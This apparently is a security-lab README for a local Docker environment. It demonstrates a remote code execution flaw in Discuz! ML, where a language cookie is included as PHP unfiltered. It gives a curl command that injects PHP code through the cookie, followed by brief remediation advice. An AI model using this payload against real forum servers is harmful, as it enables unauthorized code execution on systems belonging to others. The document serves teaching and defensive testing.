# Discuz! ML 3.x / 7.2 Cookie Language Injection Remote Code Execution

## Overview

Discuz! is an open-source Internet forum community platform built on PHP and MySQL. In Discuz! ML versions, multilingual support dynamically includes template files based on the language value passed in the Cookie header. The language cookie is concatenated directly into a cache filename and executed with PHP include without input filtering, allowing arbitrary command execution.

- **Service Access**: `http://localhost:8173/`
- **Default Credentials**: `Unauthenticated Cookie injection`
- **Docker Shortcut**: `./lab start discuz-cookie-rce`
- **Container Name**: `cyberlab_02_discuz_cookie_rce`
- **RAM Footprint**: ~60M

---

## Exploitation Walkthrough

### 1. Access Forum Index

```bash
curl -i http://localhost:8173/
```

### 2. Inject PHP Code via language Cookie

```bash
curl -i 'http://localhost:8173/forum.php' \
  -H 'Cookie: language=en".phpinfo()."'
```

### 3. Verify Code Execution

```bash
# Response outputs PHP configuration table.
```

---

## Defensive Remediation & Hardening

1. Sanitize cookie parameter values before constructing file inclusion paths.
2. Whitelist permitted language keys (en, zh, ru) strictly.

---

## Video Walkthroughs & Technical References

- [[A1] Hijacking a Session - WebGoat](https://www.youtube.com/watch?v=YO8rsCMVUyY)
- [Discuz! ML RCE Security Report](https://www.exploit-db.com/exploits/47113)
- [Vulhub Discuz Environment](https://vulhub.org/#/environments/discuz/x3.4-search-sqli/)
